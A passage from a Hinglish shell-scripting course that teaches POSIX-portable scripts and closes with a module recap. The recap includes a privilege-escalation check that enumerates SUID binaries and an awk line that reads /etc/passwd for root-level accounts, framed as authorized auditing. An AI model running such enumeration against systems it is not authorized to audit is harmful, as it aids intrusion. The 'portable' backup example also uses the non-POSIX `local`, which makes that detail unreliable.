    # Process arguments
    if [ $# -eq 0 ]; then
        printf "Usage: %s <args>\n" "$SCRIPT_NAME"
        exit 1
    fi
    
    # Main logic
    log "Processing..."
    
    log "Complete"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`[[` use karna:** Use `[` instead
- ❌ **Arrays use:** Not POSIX
- ❌ **Bash-specific features:** Avoid

### 10. **Best Practices / Pro Tips**
- 💡 **`#!/bin/sh`:** POSIX shebang
- 💡 **`shellcheck`:** Compliance check
- 💡 **Test multiple shells:** sh, dash, bash
- 💡 **Avoid bashisms:** Stick to POSIX

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/sh
# Portable backup script

set -eu

readonly BACKUP_DIR="/backups"
readonly DATE=$(date +%Y%m%d)

backup() {
    local source="$1"
    local dest="$BACKUP_DIR/backup_${DATE}.tar.gz"
    
    # Check source exists
    if [ ! -d "$source" ]; then
        printf "Error: %s not found\n" "$source" >&2
        return 1
    fi
    
    # Create backup
    tar -czf "$dest" "$source" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        printf "Backup created: %s\n" "$dest"
    else
        printf "Backup failed\n" >&2
        return 1
    fi
}

backup "${1:-/etc}"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Use `#!/bin/sh`
- ✅ Avoid `[[`, arrays
- ✅ Use `[` and loops
- ✅ Test with shellcheck
- ✅ Portable across systems

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: POSIX vs Bash?**
A: POSIX portable, Bash more features.

**Q2: Kab POSIX use karu?**
A: Cross-platform scripts ke liye.

**Q3: Compliance kaise check?**
A: `shellcheck` tool use karo.

### 14. **Practice ke liye Task**

```bash
# 1. POSIX script
#!/bin/sh
if [ "$1" = "test" ]; then
    echo "Match"
fi

# 2. Avoid arrays
items="a b c"
for i in $items; do
    echo "$i"
done

# 3. Check command
command -v git >/dev/null

# 4. Test
shellcheck script.sh
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🌍 POSIX = portable scripts
- 📝 Use `#!/bin/sh`
- 🚫 Avoid Bash-specific
- ✅ Test with shellcheck
- 🎯 Cross-platform compatibility

> **💡 Ye Zaroor Yaad Rakhein:**
> POSIX portability! `#!/bin/sh`, avoid `[[` and arrays. shellcheck use karo. Multiple shells test. Production scripts POSIX compliant!

---

# **🎉 Module 17 Complete! 🎉**

## **Aapne Kya Seekha:**
✅ **Privilege Escalation** - Security audit
✅ **File Integrity Monitor** - Change detection
✅ **User Account Audit** - User management
✅ **POSIX Compliance** - Portable scripts

## **Practical Projects:**

```bash
# PrivEsc check
find / -perm -4000 2>/dev/null

# FIM
sha256sum /etc/passwd > baseline.sha256
sha256sum -c baseline.sha256

# User audit
awk -F: '$3 == 0 {print $1}' /etc/passwd

# POSIX script
#!/bin/sh
if [ "$var" = "value" ]; then
    echo "Match"
fi
```

## **Project Concepts:**
- 🔍 Security enumeration
- 🔐 Integrity monitoring
- 👥 User management
- 🌍 Portable scripting

## **Best Practices:**
- ✅ Authorization for security tools
- ✅ Regular monitoring
- ✅ Automated audits
- ✅ POSIX for portability

**💡 Remember:** Practical projects real-world skills! Security tools authorized use. Regular monitoring essential. POSIX portability. Automate everything! 🚀

---

=============================================================